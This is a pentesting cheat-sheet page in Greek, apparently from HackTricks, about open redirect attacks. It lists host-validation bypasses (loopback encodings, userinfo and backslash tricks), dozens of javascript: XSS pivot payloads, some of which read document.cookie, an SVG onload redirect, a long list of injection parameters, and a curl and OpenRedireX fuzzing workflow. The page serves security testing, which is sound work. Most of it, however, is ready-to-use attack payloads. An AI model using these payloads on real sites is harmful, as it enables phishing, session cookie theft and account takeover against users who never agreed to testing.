# Open Redirect

{{#include ../banners/hacktricks-training.md}}


## Open redirect

### Redirect to localhost or arbitrary domains

- Εάν η εφαρμογή «allows only internal/whitelisted hosts», δοκιμάστε εναλλακτικές σημειογραφίες host για να χτυπήσετε το loopback ή εσωτερικά ranges μέσω του redirect target:
- IPv4 loopback variants: 127.0.0.1, 127.1, 2130706433 (decimal), 0x7f000001 (hex), 017700000001 (octal)
- IPv6 loopback variants: [::1], [0:0:0:0:0:0:0:1], [::ffff:127.0.0.1]
- Trailing dot and casing: localhost., LOCALHOST, 127.0.0.1.
- Wildcard DNS that resolves to loopback: lvh.me, sslip.io (e.g., 127.0.0.1.sslip.io), traefik.me, localtest.me. Αυτά είναι χρήσιμα όταν επιτρέπονται μόνο «subdomains of X» αλλά η ανάλυση του host εξακολουθεί να δείχνει στο 127.0.0.1.
- Network-path references συχνά παρακάμπτουν naive validators που προσθέτουν ένα scheme ή ελέγχουν μόνο prefixes:
- //attacker.tld → ερμηνεύεται ως scheme-relative και πλοηγεί εκτός ιστότοπου με το τρέχον scheme.
- Userinfo tricks αχρηστεύουν ελέγχους contains/startswith έναντι trusted hosts:
- https://trusted.tld@attacker.tld/ → ο browser πλοηγείται στο attacker.tld αλλά απλοί έλεγχοι συμβολοσειράς «βλέπουν» trusted.tld.
- Backslash parsing confusion μεταξύ frameworks/browsers:
- https://trusted.tld\@attacker.tld → ορισμένα backends χειρίζονται το “\” ως χαρακτήρα path και περνούν τον έλεγχο· οι browsers κανονικοποιούν σε “/” και ερμηνεύουν το trusted.tld ως userinfo, στέλνοντας χρήστες στο attacker.tld. Αυτό εμφανίζεται επίσης σε Node/PHP URL-parser mismatches.

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

### Modern open-redirect to XSS pivots
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

# Abuse bad subdomain filter
javascript://sub.domain.com/%0Aalert(1)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
<details>
<summary>Πιο σύγχρονα URL-based bypass payloads</summary>
```text
# Scheme-relative (current scheme is reused)
//evil.example

# Credentials (userinfo) trick
https://trusted.example@evil.example/

# Backslash confusion (server validates, browser normalizes)
https://trusted.example\@evil.example/

# Schemeless with whitespace/control chars
evil.example%00
%09//evil.example

# Prefix/suffix matching flaws
https://trusted.example.evil.example/
https://evil.example/trusted.example

# When only path is accepted, try breaking absolute URL detection
/\\evil.example
/..//evil.example
```

```
</details>

## Open Redirect uploading svg files

```html
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```

## Common injection parameters

```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```

## Code examples

#### .Net

```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```

#### Java

```bash
response.redirect("http://mysafedomain.com");
```

#### PHP

```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```

## Hunting and exploitation workflow (practical)

- Single URL check with curl:

```bash
curl -s -I "https://target.tld/redirect?url=//evil.example" | grep -i "^Location:"
```

- Discover and fuzz likely parameters at scale:

<details>
<summary>Click to expand</summary>

```bash
# 1) Συγκέντρωσε ιστορικά URLs, κράτησε αυτά με κοινές παραμέτρους redirect
cat domains.txt \
| gau --o urls.txt            # or: waybackurls / katana / hakrawler

# 2) Grep κοινές παραμέτρους και ομαλοποίησε τη λίστα
rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=)" urls.txt \
| sed 's/\r$//' | sort -u > candidates.txt

# 3) Χρησιμοποίησε OpenRedireX για fuzz με payload corpus
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt

# 4) Επαλήθευσε χειροκίνητα τα ενδιαφέροντα hits
awk '/30[1237]|Location:/I' results.txt
```
```
</details>

- Μην ξεχάσετε τα client-side sinks σε SPAs: ψάξτε για window.location/assign/replace και framework helpers που διαβάζουν query/hash και κάνουν redirect.

- Τα frameworks συχνά εισάγουν footguns όταν οι redirect destinations προκύπτουν από μη αξιόπιστη είσοδο (query params, Referer, cookies). Δείτε τις σημειώσεις για Next.js σχετικά με redirects και αποφύγετε δυναμικούς προορισμούς που προκύπτουν από είσοδο χρήστη.

{{#ref}}
../network-services-pentesting/pentesting-web/nextjs.md
{{#endref}}

- OAuth/OIDC flows: η κατάχρηση open redirectors συχνά κλιμακώνεται σε account takeover μέσω leaking authorization codes/tokens. Δείτε τον αφιερωμένο οδηγό:

{{#ref}}
./oauth-to-account-takeover.md
{{#endref}}

- Οι server responses που υλοποιούν redirects χωρίς Location (meta refresh/JavaScript) είναι ακόμα εκμεταλλεύσιμες για phishing και μερικές φορές μπορούν να αλυσιδωθούν. Grep for:
```html
<meta http-equiv="refresh" content="0;url=//evil.example">
<script>location = new URLSearchParams(location.search).get('next')</script>
```
## Εργαλεία

- [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)
- OpenRedireX – fuzzer για την ανίχνευση open redirects. Παράδειγμα:
```bash
# Install
git clone https://github.com/devanshbatham/OpenRedireX && cd OpenRedireX && ./setup.sh

# Fuzz a list of candidate URLs (use FUZZ as placeholder)
cat list_of_urls.txt | ./openredirex.py -p payloads.txt -k FUZZ -c 50
```
## Αναφορές

- Στο https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect μπορείτε να βρείτε fuzzing lists.
- [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
- [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)
- PortSwigger Web Security Academy – DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- OpenRedireX – Ένας fuzzer για την ανίχνευση open redirect vulnerabilities: https://github.com/devanshbatham/OpenRedireX

{{#include ../banners/hacktricks-training.md}}
